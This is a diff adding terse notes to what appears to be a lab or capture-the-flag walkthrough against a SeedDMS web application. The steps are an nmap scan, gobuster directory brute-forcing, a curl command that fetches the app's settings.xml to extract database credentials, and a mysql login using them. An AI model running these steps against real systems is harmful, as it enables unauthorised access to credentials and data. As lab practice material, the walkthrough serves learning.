@@ -1,7 +1,17 @@
+nmap to scan for open ports and ip of the target machine.
+nmap -sV -sP 10.0.0.15/24
 sudo nmap -v -T4 -A -p- -oN nmap.log 192.168.19.131
 
+
+used go buster to bruteforce directories:
 gobuster dir \
 -u http://192.168.87.104/seeddms51x \
 -w /usr/share/wordlists/rockyou.txt \
 -edrf \
 -x php,html,cgi
+
+Command used to find the database username and password:
+curl http://192.168.87.104/seeddms51x/conf/settings.xml -sL | grep -i db
+
+Logging into the mysql database:
+mysql -u seeddms -pseeddms -D seeddms --silent -h 10.0.0.220
